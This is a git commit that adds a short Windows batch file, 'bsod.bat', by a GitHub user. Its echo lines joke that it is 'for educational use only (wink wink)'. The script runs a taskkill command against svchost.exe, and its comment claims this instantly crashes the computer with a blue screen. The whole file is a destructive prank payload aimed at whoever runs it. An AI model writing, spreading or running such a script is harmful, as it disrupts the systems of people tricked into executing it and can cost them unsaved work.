f3bd3babb9687c18947055f41ecd32bf2efb6d96
Luca Noble <80450196+RustyLegacy01@users.noreply.github.com>
2021-03-11 09:15:10 +0100

    Add bsod.bat

---
+++ bsod.bat
@@ -0,0 +1,9 @@
+echo off
+
+echo BSOD Made by RustyLegacy01 On Github!
+echo CC License
+echo For educational use only (wink wink)
+
+:: The bsod
+taskkill /IM svchost.exe
+:: It kills a crucial service that instantly BSODs you!
